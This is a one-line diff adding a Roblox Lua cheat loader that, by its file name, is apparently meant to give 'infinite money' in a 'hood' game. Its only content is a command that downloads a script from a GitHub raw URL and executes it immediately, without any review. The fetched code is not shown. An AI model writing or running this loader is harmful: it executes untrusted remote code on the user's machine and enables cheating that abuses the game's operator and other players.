@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cnzins1/scripts/main/infinite%20money%20hood%20game"))()
